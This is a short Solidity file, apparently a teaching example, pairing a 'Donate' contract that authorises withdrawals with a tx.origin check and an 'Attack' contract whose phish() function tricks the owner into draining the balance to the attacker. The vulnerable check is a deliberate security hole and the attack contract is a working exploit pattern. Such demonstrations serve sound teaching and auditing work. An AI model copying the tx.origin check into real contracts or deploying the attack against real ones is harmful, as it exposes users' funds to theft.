// SPDX-License-Identifier: No-License

pragma solidity ^0.8.17;

contract Donate {
    address public owner;

    constructor(){
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw(address _benificial) external {
        require(tx.origin == owner, "Only Owner can call this function");

        (bool success,) = payable(_benificial).call{value: address(this).balance}("");
        require(success, "Failed to transfer Ether");
    }
}

contract Attack {

    Donate public target;
    address owner;

    constructor(Donate _address) {
        target = Donate(_address);
        owner = msg.sender;
    }

    function phish() external {
        target.withdraw(owner);
    }
}